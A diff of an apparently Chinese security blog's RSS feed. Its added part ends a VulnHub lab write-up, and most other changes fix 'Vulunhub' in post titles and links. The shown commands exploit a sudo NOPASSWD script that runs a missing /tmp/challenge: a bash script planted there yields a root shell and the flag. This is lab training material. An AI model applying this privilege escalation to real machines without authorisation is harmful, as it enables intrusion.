+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Matching Defaults entries &lt;span class="k"&gt;for&lt;/span&gt; saket on ubuntu:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; env_reset, mail_badpass,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;secure_path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/bin&lt;span class="se"&gt;\:&lt;/span&gt;/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/bin&lt;span class="se"&gt;\:&lt;/span&gt;/snap/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User saket may run the following commands on ubuntu:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; NOPASSWD: /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ ls -la /home/victor/undefeated_victor&lt;span class="p"&gt;;&lt;/span&gt; file /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -la /home/victor/undefeated_victor&lt;span class="p"&gt;;&lt;/span&gt; file /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rwsr-x--x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;79&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/home/victor/undefeated_victor: setuid executable, regular file, no &lt;span class="nb"&gt;read&lt;/span&gt; permission
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; you can defeat me &lt;span class="k"&gt;then&lt;/span&gt; challenge me in front of you
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;找到最终提权点：/home/victor/undefeated_victor 是一个以 root 运行的脚本，它第 2 行会执行 /tmp/challenge，但该文件不存在。所以只要在 /tmp/challenge 放一个可执行文件，它就会以 root 身份运行。&lt;/p&gt;
+&lt;p&gt;或许是一个“路径劫持”或“缺失文件利用”&lt;/p&gt;
+&lt;h3 id="提权至root并读取flag"&gt;提权至root并读取flag
+&lt;/h3&gt;&lt;p&gt;依次在shell执行如下命令&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;#!/bin/bash&amp;#39;&lt;/span&gt; &amp;gt;challenge
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/bin/bash&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt;challenge
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; chmod +x challenge
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; whoami
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo /home/victor/undefeated_victor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; you can defeat me &lt;span class="k"&gt;then&lt;/span&gt; challenge me in front of you
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@ubuntu:/root# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@ubuntu:/tmp# &lt;span class="nb"&gt;cd&lt;/span&gt; /root
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /root
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@ubuntu:/root# ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 92K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;917506&lt;/span&gt; drwx------ &lt;span class="m"&gt;5&lt;/span&gt; root root 4.0K Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;24&lt;/span&gt; root root 4.0K Aug &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;964588&lt;/span&gt; -rw------- &lt;span class="m"&gt;1&lt;/span&gt; root root 8.4K Sep &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .bash_history
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;917598&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root 3.1K Oct &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;2015&lt;/span&gt; .bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;917597&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; root root 4.0K Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .cache
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969793&lt;/span&gt; -rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root 14K Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; enc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969795&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;305&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; enc.cpp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969797&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;237&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; enc.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969798&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;123&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; key.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969791&lt;/span&gt; -rw------- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;137&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .mysql_history
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;964098&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; root root 4.0K Aug &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .nano
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;917599&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;148&lt;/span&gt; Aug &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;2015&lt;/span&gt; .profile
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969794&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;33&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969796&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;66&lt;/span&gt; Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .selected_editor
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969780&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;805&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; sql.py
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;969790&lt;/span&gt; -rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;442&lt;/span&gt; Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; t.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;964589&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;10&lt;/span&gt; root root 4.0K Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; wfuzz
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;964464&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;170&lt;/span&gt; Aug &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; wordpress.sql
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@ubuntu:/root# cat root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;b2b17036da1de94cfb024540a8e7075a
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item><item><title>DarkHole2.0 Vulunhub靶场复现</title><link>https://ke1thli.github.io/p/darkhole2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Sat, 19 Sep 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/darkhole2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="darkhole2-vulunhub靶场复现"&gt;DarkHole2 Vulunhub靶场复现
 &lt;/h1&gt;&lt;h2 id="靶场介绍"&gt;靶场介绍
 &lt;/h2&gt;&lt;p&gt;靶场地址 &lt;a class="link" href="https://www.vulnhub.com/entry/darkhole-2,740/" target="_blank" rel="noopener"
  &gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/a&gt;&lt;/p&gt;
@@ -116,7 +1121,7 @@
 &lt;/h3&gt;&lt;p&gt;对80端口进行访问&lt;/p&gt;
 &lt;p&gt;有两个按钮分别是 View Datils ,点击没用，有一个 login 点击跳转 /login.php&lt;/p&gt;
 &lt;p&gt;看来目前方向80端口的web入口，优先级是看看 .git 泄露&lt;/p&gt;
-&lt;h3 id="端口扫描"&gt;端口扫描
+&lt;h3 id="目录爆破"&gt;目录爆破
 &lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -1133,7 +2138,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;DarkHole&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Legend&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Bossplayerctf 1 Vulunhub靶场复现-重走来时路7</title><link>https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF7/</link><pubDate>Wed, 12 Aug 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF7/</guid><description>&lt;h1 id="bulldog-1-复现-vulunhub靶场复现-重走来时路"&gt;Bulldog 1 复现 Vulunhub靶场复现-重走来时路
+&lt;/div&gt;</description></item><item><title>Bossplayerctf 1 Vulnhub靶场复现-重走来时路7</title><link>https://ke1thli.github.io/p/bossplayerctf-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF7/</link><pubDate>Wed, 12 Aug 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/bossplayerctf-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF7/</guid><description>&lt;h1 id="bulldog-1-复现-vulnhub靶场复现-重走来时路"&gt;Bulldog 1 复现 Vulnhub靶场复现-重走来时路
 &lt;/h1&gt;&lt;h2 id="靶场介绍与搭建"&gt;靶场介绍与搭建
 &lt;/h2&gt;&lt;p&gt;下载地址 &lt;a class="link" href="https://vulnhub.com/entry/bulldog-1,211/" target="_blank" rel="noopener"
  &gt;https://vulnhub.com/entry/bulldog-1,211/&lt;/a&gt;&lt;/p&gt;
@@ -2271,7 +3276,7 @@ CANTget&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@bulldog:~# 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Bottleneck 1 Vulunhub靶场复现-重走来时路6</title><link>https://ke1thli.github.io/p/bottleneck-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF6/</link><pubDate>Tue, 11 Aug 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/bottleneck-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF6/</guid><description>&lt;h1 id="bottleneck-vulnhub-靶场复现"&gt;Bottleneck VulnHub 靶场复现
+&lt;/div&gt;</description></item><item><title>Bottleneck 1 Vulnhub靶场复现-重走来时路6</title><link>https://ke1thli.github.io/p/bottleneck-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF6/</link><pubDate>Tue, 11 Aug 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/bottleneck-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF6/</guid><description>&lt;h1 id="bottleneck-vulnhub-靶场复现"&gt;Bottleneck VulnHub 靶场复现
 &lt;/h1&gt;&lt;h2 id="靶场介绍与搭建"&gt;靶场介绍与搭建
 &lt;/h2&gt;&lt;p&gt;下载地址：&lt;/p&gt;
 &lt;p&gt;&lt;a class="link" href="https://download.vulnhub.com/bottleneck/Bottleneck.ova" target="_blank" rel="noopener"
@@ -4324,7 +5329,7 @@ After some cyber attacks the admin hardened the system, show him that it&amp;rsq
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;flag{w0w_y0u_h4v3_r00t3d_bottleneck}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;至此，Bottleneck 两个 Flag 均已获取，靶场完成。&lt;/p&gt;</description></item><item><title>Bossplayerctf 1 Vulunhub靶场复现-重走来时路5</title><link>https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF5/</link><pubDate>Mon, 10 Aug 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF5/</guid><description>&lt;h1 id="bossplayerctf-vulnhub-靶场复现"&gt;BossplayerCTF VulnHub 靶场复现
+&lt;/div&gt;&lt;p&gt;至此，Bottleneck 两个 Flag 均已获取，靶场完成。&lt;/p&gt;</description></item><item><title>Bossplayerctf 1 Vulnhub靶场复现-重走来时路5</title><link>https://ke1thli.github.io/p/bossplayerctf-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF5/</link><pubDate>Mon, 10 Aug 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/bossplayerctf-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF5/</guid><description>&lt;h1 id="bossplayerctf-vulnhub-靶场复现"&gt;BossplayerCTF VulnHub 靶场复现
 &lt;/h1&gt;&lt;h2 id="靶场介绍与搭建"&gt;靶场介绍与搭建
 &lt;/h2&gt;&lt;p&gt;下载地址 &lt;a class="link" href="https://www.vulnhub.com/entry/bossplayersctf-1,375/" target="_blank" rel="noopener"
  &gt;https://www.vulnhub.com/entry/bossplayersctf-1,375/&lt;/a&gt;&lt;/p&gt;
@@ -6965,7 +7970,7 @@ god\administrator&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;[07/22 03:00:29] [+] host called home, sent: 161 bytes
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>SkyTower Vulunhub靶场复现-重走来时路3</title><link>https://ke1thli.github.io/p/skytower-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF3/</link><pubDate>Sun, 19 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/skytower-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF3/</guid><description>&lt;h1 id="skytower-vulunhub靶场复现-重走来时路-3"&gt;SkyTower Vulunhub靶场复现-重走来时路 3
+&lt;/div&gt;</description></item><item><title>SkyTower Vulnhub靶场复现-重走来时路3</title><link>https://ke1thli.github.io/p/skytower-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF3/</link><pubDate>Sun, 19 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/skytower-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF3/</guid><description>&lt;h1 id="skytower-vulnhub靶场复现-重走来时路-3"&gt;SkyTower Vulnhub靶场复现-重走来时路 3
 &lt;/h1&gt;&lt;h2 id="注意事项"&gt;注意事项
 &lt;/h2&gt;&lt;p&gt;靶场地址 &lt;a class="link" href="https://vulnhub.com/entry/skytower-1,96/" target="_blank" rel="noopener"
  &gt;https://vulnhub.com/entry/skytower-1,96/&lt;/a&gt;&lt;/p&gt;
@@ -7729,7 +8734,7 @@ to the flag.txt file in the /root/ directory&lt;/p&gt;
 &lt;p&gt;✔ 数据库枚举&lt;/p&gt;
 &lt;p&gt;✔ Linux横向移动&lt;/p&gt;
 &lt;p&gt;✔ sudo配置错误&lt;/p&gt;
-&lt;p&gt;✔ 路径遍历&lt;/p&gt;</description></item><item><title>DarkHole1.0 Vulunhub靶场复现-重走来时路2</title><link>https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/</link><pubDate>Sat, 18 Jul 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/</guid><description>&lt;h1 id="darkhole1-vulunhub靶场复现-重走来时路-2"&gt;DarkHole1 Vulunhub靶场复现-重走来时路 2
